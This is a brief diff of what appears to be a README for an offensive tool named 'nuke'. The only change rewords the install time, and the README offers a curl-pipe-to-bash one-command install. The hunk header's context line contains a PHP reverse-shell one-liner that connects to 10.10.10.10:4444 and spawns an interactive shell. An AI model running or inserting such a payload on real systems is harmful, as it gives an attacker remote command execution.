@@ -48,7 +48,7 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 </div>
 
 
-   <b> Installation in 20 seconds ( One Command ) </b>
+   <b> Installation in few min's ( One Command ) </b>
    
   ```bash
   curl -sSL https://raw.githubusercontent.com/notjustdanish/nuke/main/install.sh | bash
